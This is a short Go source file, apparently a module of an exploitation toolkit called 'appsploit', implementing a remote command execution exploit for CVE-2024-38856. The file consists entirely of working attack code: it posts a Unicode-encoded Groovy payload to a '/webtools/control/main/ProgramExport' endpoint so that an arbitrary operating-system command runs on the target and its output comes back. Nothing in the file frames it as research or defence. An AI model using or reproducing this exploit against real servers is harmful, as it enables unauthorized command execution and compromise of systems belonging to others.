package cve_2024_38856

import (
	"appsploit/pkg/utils"
	"fmt"
)

func Exploit(baseURL string, command string) (resp string, err error) {
	httpClient := *utils.Http.Client()
	httpClient.SetHeader("Content-Type", "application/x-www-form-urlencoded")
	encodedCommand := utils.Common.EncodeToUnicode(fmt.Sprintf("throw new Exception('%s'.execute().text);", command))
	body := fmt.Sprintf("groovyProgram=%s", encodedCommand)
	if resp, err := httpClient.SetBody(body).Post(baseURL + "/webtools/control/main/ProgramExport"); err != nil {
		return "", err
	} else {
		return resp.String(), nil
	}
}
